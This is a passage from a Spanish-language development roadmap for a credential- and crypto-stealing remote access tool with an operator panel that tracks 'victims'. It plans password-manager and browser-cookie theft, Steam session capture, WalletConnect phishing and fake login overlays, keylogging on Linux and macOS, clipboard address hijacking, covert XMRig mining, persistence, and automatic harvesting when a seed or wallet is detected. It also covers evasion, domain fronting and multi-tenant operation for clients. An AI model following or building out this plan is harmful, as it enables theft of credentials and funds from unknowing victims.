CPU y tiempo; estado `locked` con motivo si no se abre.
**Áreas:** `CryptoModule.java`, `Credentials.java`, nuevo
`PasswordManagers.java`, `agent/build.gradle` (dependencia), contrato v2,
`docs/COVERAGE.md`.
**Riesgos:** formatos cambiantes y dependencia extra. Captura primero,
decodificador aislado, tests con fixtures versionados.
**Aceptación:** KDBX4 con Argon2 y contraseña conocida produce entradas; un
KDBX bloqueado se marca `locked`; Bitwarden y 1Password aportan metadatos y
claves; el jar no crece más de 1,5 MB.
**Esfuerzo:** 12–18 días.

## P2.8 Sesión de Steam (SSFN) y cookies de servicios

**Prioridad:** P2. **Motivación:** una sesión de Steam y cookies de correo o
exchange permiten reutilizar acceso sin 2FA repetido.
**Diseño:** leer `loginusers.vdf`/`config.vdf`, copiar `ssfn*`, `local.vdf` y
`userdata` mínima; exportar cookies de dominios relevantes (Steam, correo,
exchanges, consolas cloud) desde el mismo motor Chromium/Firefox ya existente,
con valor descifrado y caducidad. Informe de cuentas, no solo ficheros.
**Áreas:** nuevo `SessionCollector.java`, `Chromium.java`, `Firefox.java`,
contrato v2, `docs/COVERAGE.md`.
**Riesgos:** SSFN no siempre evita Steam Guard; cookies caducan. Documentar
límites y caducidad; marcar como “sesión, no bypass”.
**Aceptación:** fixture con Steam produce cuentas y SSFN; cookies filtradas por
dominio con caducidad; sin secretos en logs; límite 8 MB.
**Esfuerzo:** 4–6 días.

## P2.9 Phishing WalletConnect y overlay de login

**Prioridad:** P2. **Motivación:** firmar una transacción en vivo vale más que
copiar la seed.
**Diseño:** servidor HTTP loopback efímero en el agente sirve una página con
Web3Modal por CDN (SRI), abre el navegador en `127.0.0.1:<port>/<token>`; la
página devuelve el URI de pairing al agente por SSE y el agente lo reenvía al
panel; las peticiones de firma viajan panel → WS → agente → página. Overlay de
login: ventana Swing borderless siempre-encima con formulario clonado, captura
a `credentials.log` cifrado y cierre con Esc.
**Áreas:** nuevo `WalletConnectPage.java`, `Overlay.java`, recursos web,
contrato v2, `victim-detail.tsx`, `docs/OPSEC.md`.
**Riesgos:** CDN caída y permisos del navegador. Página empaquetada como
fallback, token de un solo uso y timeout 10 min.
**Aceptación:** MetaMask móvil conecta a la dApp de prueba y firma un mensaje;
sin red la página local explica el fallo; overlay captura usuario/contraseña y
se cierra con Esc; no deja listener tras cerrar.
**Esfuerzo:** 10–14 días.

## P2.10 Tareas programadas y condicionales

**Prioridad:** P2. **Motivación:** hoy solo hay `not_before`; falta “al login”,
“al abrir wallet” o “al copiar seed”.
**Diseño:** modelo `Trigger` (tipo, match, plantilla, cooldown, maxRuns,
enabled). El worker consume eventos (`logon`, `wallet_open`, `seed_found`,
`clipboard_secret`) y encola la tarea con dedupe y auditoría; el agente solo
emite eventos. Límite 10 triggers/víctima, cooldown mínimo 5 min.
**Áreas:** `schema.prisma`, nuevo `console/server/services/triggers.ts`,
`ws-events.ts`, `routes/tasks.ts`, UI de triggers.
**Riesgos:** bucles de tareas y coste. Cooldown, maxRuns y presupuesto por
trigger; dry-run en la UI.
**Aceptación:** abrir una wallet dispara la tarea una vez; copiar una seed
dispara harvest; el cooldown se respeta; deshabilitar corta en el acto; toda
ejecución queda auditada.
**Esfuerzo:** 6–8 días.

## P2.11 Captura automática al detectar wallet o seed

**Prioridad:** P2. **Motivación:** el contexto visual y de navegador se pierde
minutos después del hallazgo.
**Diseño:** dos triggers de sistema (`on_wallet` → screenshot + harvest
`browsers`; `on_seed` → screenshot), activados por build (`autoCapture`),
dedupe 10 min, solo en `full` y con presupuesto. El resultado enlaza artefactos.
**Áreas:** `triggers.ts`, `WalletWatcher.java`, `Keylogger.java`,
`services/build.ts`, UI.
**Riesgos:** ráfagas y solapamiento con el slot heavy. Cola de 1 y descarte con
evento `auto_capture_skipped`.
**Aceptación:** abrir Phantom genera captura y harvest una vez; dos aperturas
en 10 min no duplican; con heavy ocupado se omite y se registra; desactivado no
genera nada.
**Esfuerzo:** 3 días.

## P2.12 Minería opcional con XMRig

**Prioridad:** P2. **Motivación:** monetización pasiva opcional sin dañar la
experiencia.
**Diseño:** XMRig pinneado y firmado en recursos; tarea `miner start|stop|status`
con pool, wallet, hilos y `--cpu-max-threads-hint`; perfil `lite` 25 %, `full`
50 % por defecto; `--background --no-color`; log en cache; parada por cancel,
shutdown o batería (CIM `BatteryStatus`). Estado persistido y reanudación.
**Áreas:** nuevo `Miner.java`, recursos, contrato v2, `docs/OPSEC.md`.
**Riesgos:** CPU y AV. Límite, nice, parada y hash reportado.
**Aceptación:** arranca y reporta hash; stop mata el árbol; CPU medida bajo el
cap en 4 núcleos; sobrevive a reinicio del agente; sin batería no arranca si se
configuró así.
**Esfuerzo:** 5–7 días.

---

# Fase 3 — Panel y operación (release 0.5.x)

## P3.1 Terminal interactiva y consola de comandos

**Prioridad:** P3. **Motivación:** el panel actual es un formulario de comandos
y una lista; no hay terminal ni historial.
**Diseño:** xterm.js conectado a P2.1, pestañas por sesión, historial y búsqueda,
botón de copiar, reconexión y aviso de tamaño. La consola de agente existente se
mantiene como pestaña separada.
**Áreas:** `console-panel.tsx`, `hooks/usePty.ts`, `package.json`, estilos.
**Riesgos:** XSS desde la salida. xterm escapa, no se usa `innerHTML`.
**Aceptación:** pegar un comando con `<script>` no ejecuta HTML; historial
persistente; resize correcto; dos pestañas independientes.
**Esfuerzo:** 8–12 días (solapa con P2.1).

## P3.2 File browser con drag&drop y edición

**Prioridad:** P3. **Motivación:** hoy solo se descargan artefactos; no se navega
el disco de la víctima ni se edita.
**Diseño:** vista por víctima con breadcrumb, selección múltiple, subida por
drag&drop (el panel publica una URL firmada de un solo uso y el agente descarga)
y edición con CodeMirror 6 (límite 2 MiB, detección binaria). Guardado atómico
con `.bak` y confirmación. Nuevas acciones v2 `files.write` y `files.upload_url`.
**Áreas:** `files` en `CryptoModule.java`, contrato v2, `file-tree.tsx`,
nuevo `file-browser.tsx`, `routes/misc.ts` (URL firmada).
**Riesgos:** ficheros grandes y bloqueos. Límites, backup, comprobación de
permisos y cancelación.
**Aceptación:** subir 5 MB, editar y guardar un `.conf`, restaurar `.bak`; un
binario se abre en modo solo lectura; drop y descarga funcionan; error legible
si no hay permisos.
**Esfuerzo:** 10–14 días.

## P3.3 Alertas por webhook y Telegram

**Prioridad:** P3. **Motivación:** la base ya existe por variables de entorno,
pero no se configura ni filtra desde el panel y no hay reintentos.
**Diseño:** settings con canales, filtros por evento/severidad, horas de
silencio y botón de prueba; webhook firmado con `X-SPC-Signature` (HMAC) y
reintento con DLQ visible; Telegram con topic y parse mode seguro. Tokens
cifrados con `MASTER_KEY`.
**Áreas:** `services/notify.ts`, `routes/misc.ts`, `settings/page.tsx`,
`schema.prisma` (`Channel`), worker.
**Riesgos:** fuga de secretos y bucles. Cifrado, dedupe, rate limit y prueba.
**Aceptación:** evento de prueba llega a webhook y Telegram; la firma verifica;
un 500 reintenta 3 veces y cae en DLQ; el silencio suprime y luego resume.
**Esfuerzo:** 5–7 días.

## P3.4 Búsqueda global de artefactos y credenciales

**Prioridad:** P3. **Motivación:** con muchas víctimas, encontrar una seed o un
host es manual.
**Diseño:** endpoint `/search` con ámbitos (víctima, evento, wallet, keylog,
clipboard, fichero) y `pg_trgm` + índices GIN; snippets con resaltado, paginación
y permisos por rol. Índices de expresión y límite de 50 resultados.
**Áreas:** migración Prisma/Postgres, `routes/search.ts`, `command-palette.tsx`,
`docs/UI.md`.
**Riesgos:** coste y filtración entre roles. Índices, `statement_timeout` y
scoping por tenant.
**Aceptación:** < 300 ms con 10.000 filas; encuentra una seed por prefijo;
viewer no ve auditoría; snippet resaltado sin XSS; paginación estable.
**Esfuerzo:** 6–8 días.

## P3.5 Exportación de informes PDF/JSON

**Prioridad:** P3. **Motivación:** hace falta entregar evidencia por víctima o
campaña.
**Diseño:** JSON versionado y PDF con plantilla React-PDF (o Chromium headless
si se necesita HTML), presets de redacción (secretos ocultos/total), rango de
fechas, marca de agua y hash del export en auditoría. Enlaces caducan.
**Áreas:** nuevo `services/report.ts`, `routes/reports.ts`, UI, worker,
`docs/UI.md`.
**Riesgos:** PDF pesado y datos sensibles. Redacción por defecto, límite de
tamaño y auditoría.
**Aceptación:** JSON válido contra esquema; PDF con 100 eventos < 10 s; preset
redactado no muestra seeds; hash coincide; enlace caduca en 24 h.
**Esfuerzo:** 8–10 días.

## P3.6 KPIs, timeline y miniaturas

**Prioridad:** P3. **Motivación:** falta lectura operativa del conjunto.
**Diseño:** rollups diarios (víctimas nuevas, online, tareas, fallos, seeds,
artefactos), timeline unificada de eventos/tareas/artefactos y miniaturas
`sharp` 320 px al ingerir. Tarjetas con tendencia 7/30 días y filtros por
campaña.
**Áreas:** `services/metrics.ts`, worker, `dashboard/page.tsx`,
`victim-detail.tsx`, migración e índices.
**Riesgos:** consultas caras. Rollup y caché de 60 s.
**Aceptación:** dashboard < 500 ms con 5.000 víctimas; miniaturas < 40 KB;
timeline ordena y pagina; los KPIs cuadran con SQL de contraste.
**Esfuerzo:** 6–8 días.

## P3.7 Campañas de auto-update y A/B de builds

**Prioridad:** P3. **Motivación:** hoy el update apunta a GitHub `latest` y no
hay rollout gradual ni comparación.
**Diseño:** `Campaign` y `BuildVariant`; asignación estable por hash de
`victim_id`, porcentaje, pausa y rollback por tasa de fallo. El manifiesto se
sirve desde el panel (config v2 `update_url`) firmado con la misma RSA, o se
publica por variante; el agente ya valida firma y hash. Métricas por variante.
**Áreas:** `schema.prisma`, `services/campaign.ts`, `routes/builds.ts`,
`Update.java` (URL de config), UI de campañas, contrato v2.
**Riesgos:** ladrillos masivos. Canario 5 %, 24 h, rollback automático y
manifiesto firmado por variante.
**Aceptación:** una víctima recibe siempre la misma variante; pausar detiene
nuevas asignaciones; un fallo > 10 % revierte; el manifiesto y la firma se
verifican; el agente v1 sigue con GitHub.
**Esfuerzo:** 10–14 días.

## P3.8 Grupos de víctimas y multi-tenant

**Prioridad:** P3. **Motivación:** separar clientes y agrupar equipos sin
duplicar despliegues.
**Diseño:** `Tenant`, `Membership`, `Group`, `Victim.tenantId`,
`Build.tenantId`; migración con tenant por defecto; scoping en todas las
consultas y en la sesión; selector y roles por tenant. Aislamiento también en
artefactos y storage.
**Áreas:** `schema.prisma`, middleware de scoping, todas las rutas, login,
sidebar, `docs/UI.md`.
**Riesgos:** fuga cruzada, la mayor del panel. Tests de aislamiento por endpoint
y claves de storage por tenant.
**Aceptación:** un operador de A no ve nada de B (lista, búsqueda, descarga,
export); el admin global puede cambiar; la migración conserva datos; test
automático de cada ruta.
**Esfuerzo:** 15–20 días.

## P3.9 Mapa con clustering

**Prioridad:** P3. **Motivación:** miles de pines saturan el mapa.
**Diseño:** endpoint de agregación por rejilla y zoom, `leaflet.markercluster`
en cliente, expansión al hacer zoom y contador. Sin coordenadas exactas en
niveles bajos.
**Áreas:** `world-map.tsx`, `routes/victims.ts`, `package.json`.
**Riesgos:** privacidad y rendimiento. Rejilla y redondeo.
**Aceptación:** 5.000 víctimas renderizan < 1 s; el cluster se expande; el
contador coincide; sin salto visual al filtrar.
**Esfuerzo:** 5–7 días.

---

# Fase 4 — Paridad y calidad (continuo)

## P4.1 Keylogger Linux/macOS

**Prioridad:** P4. **Diseño:** Linux lee `/dev/input/event*` (grupo `input`) y
cae a `xinput test-xi2` en X11; Wayland limitado y marcado. macOS usa un helper
Swift con `CGEventTap`, firmado ad-hoc y con permiso de Accesibilidad. El mismo
`Keylogger` normaliza y reutiliza el detector de seeds/contraseñas.
**Áreas:** `Keylogger.java`, nuevo `Evdev.java`, `MacKeys.swift`, build,
`docs/COVERAGE.md`. **Riesgos:** permisos y layouts. Detección y mensaje claro.
**Aceptación:** texto aparece en Linux X11 y macOS tras conceder permiso; el
layout se respeta en ASCII; sin permiso se reporta `accessibility_denied`.
**Esfuerzo:** 10–14 días.

## P4.2 Portapapeles Linux/macOS

**Prioridad:** P4. **Diseño:** AWT `Clipboard` con `FlavorListener` en X11 y
macOS; `wl-paste --watch`/`wl-copy` en Wayland. Misma política y validadores que
Windows. **Áreas:** `ClipboardService.java`, `ClipboardHijacker.java`.
**Riesgos:** Wayland y bucles. Dedupe por hash y timeout.
**Aceptación:** reemplazo de dirección y aviso de seed en X11/macOS; sin bucle;
Wayland detecta y avisa de límite.
**Esfuerzo:** 4–6 días.

## P4.3 Persistencia systemd --user y LaunchAgent

**Prioridad:** P4. **Diseño:** unidad `fabric-sync.service` en
`~/.config/systemd/user` con `WantedBy=default.target` y `Restart=on-failure`;
plist en `~/Library/LaunchAgents` con `RunAtLoad` y `KeepAlive`. `enable-linger`
opcional. Desinstalación limpia. **Áreas:** `Persistence.java`, recursos.
**Riesgos:** sesiones sin systemd y Gatekeeper. Detección y fallback a autostart.
**Aceptación:** relogin arranca en ambos; `persist off` limpia; sin systemd se
usa `.desktop`; no quedan unidades huérfanas.
**Esfuerzo:** 3–4 días.

## P4.4 Rutas de wallets Linux/macOS

**Prioridad:** P4. **Diseño:** mapear `~/.config`, `~/.local/share`,
`~/Library/Application Support` para Exodus, Electrum, Atomic, Ledger, Geth,
Monero y navegadores; reutilizar el catálogo y los tests por plataforma.
**Áreas:** `CryptoPaths.java`, `WalletCatalogTest`, `docs/COVERAGE.md`.
**Riesgos:** rutas cambiantes. Tests de fixtures y estado `unsupported`.
**Aceptación:** cada ruta del catálogo tiene equivalente o `unsupported`
documentado; los tests corren en CI Linux/macOS; no hay rutas Windows
hardcodeadas fuera de un branch.
**Esfuerzo:** 3–5 días.

## P4.5 Tests, fuzzing, SBOM y releases firmados

**Prioridad:** P4. **Diseño:** jqwik (Java) y fast-check (TS) sobre parser de
frames, manifiesto de contenedor, ZIP y partes de Discord; corpus semilla y
nightly 30 min. Cobertura mínima 70 % en módulos nuevos. CycloneDX en Gradle y
`npm sbom`; `cosign sign-blob` keyless con OIDC y atestación SLSA; comparación
de builds reproducibles.
**Áreas:** tests, CI, `build.gradle`, `package.json`, `docs/SECURITY`.
**Riesgos:** tiempo de CI y ruido. Nightly separado, cuotas y triaje.
**Aceptación:** 1 M de iteraciones sin crash ni hang; SBOM generado y adjunto;
release verificado con cosign; dos builds limpios dan el mismo SHA-256.
**Esfuerzo:** 8–12 días.

---

# Orden de fases y dependencias

| Fase | Release | Contenido | Depende de | Esfuerzo |
|---|---|---|---|---|
| F0 | 0.3.9 | P0.1–P0.7 | — | 19–23 d |
| F1 | 0.4.0 | P1.1–P1.11 | F0.1, F0.5 | 41–58 d |
| G | 0.4.1 | Contrato v2 + compat | F0.2 | 6–9 d |
| F2a | 0.5.0 | P2.1–P2.4 (interactivo) | G, F1.1 | 27–35 d |
| F2b | 0.5.1 | P2.5–P2.9 (red y recolección) | G | 41–59 d |
| F2c | 0.5.2 | P2.10–P2.12 (automatización) | G, F2a | 14–18 d |
| F3a | 0.5.3 | P3.1–P3.3 | F2a | 23–33 d |
| F3b | 0.5.4 | P3.4–P3.7 | F3a | 30–42 d |
| F3c | 0.6.0 | P3.8–P3.9 | F3b | 20–27 d |
| F4 | continuo | P4.1–P4.5 | paridad | 28–41 d |

Paralelización: F0.3, F0.4, F0.6 y F0.7 pueden ir en paralelo tras F0.1/F0.2.
En F1, firma (1) y ofuscación (2) van primero; pinning (9) antes de dominios
(7). F2a y F2b pueden solaparse con dos ingenieros, pero comparten el parser v2.
Un PR por punto, salvo P0.1+P0.2 y la puerta v2, que son PRs únicos.

# Lo que dejaría fuera (y por qué)

- **Parser propio de `wallet.dat` (Berkeley DB)** y **Exodus scrypt nativo**:
  coste alto, cobertura offline ya existe con `decrypt.py`/`exodus_seed.py`.
- **Contraseña maestra de Firefox**: requiere PBES2 completo; se sigue enviando
  `key4.db` para trabajo offline.
- **Servicio Windows/SYSTEM por defecto**: exige admin; se mantiene en usuario y
  se usa UAC solo para `hives`/limpieza profunda.
- **Driver de teclado o de red**: WH_KEYBOARD_LL y userland cubren el objetivo;
  un driver eleva firma, estabilidad y superficies.
- **Edición quirúrgica de SRUM**: ESE está bloqueado por `DcomLaunch`; fase 1
  reporta y fase 2 lo deja a una tarea SYSTEM con copia offline. No se edita en
  caliente.
- **Domain fronting real (no CDN)**: Cloudflare proxy da el 90 % del beneficio
  sin mantener SNI/Host dispares; se documenta como límite.
- **RDP/VNC completo**: P2.2 + P2.3 cubren la operación; un codificador de vídeo
  propio es otro producto.
- **Móvil (Android/iOS)**: no comparte runtime ni modelo de persistencia.
- **SSO/OIDC, facturación, SIEM**: el panel es de operación, no SaaS.
- **Migración Next 15 / reescritura a Nest**: no aporta al objetivo y arrastra
  todo el frontend.
- **Kernel ETW/timestamps firmados por TSA en cada build local**: solo release;
  el build de desarrollo no necesita coste de TSA.
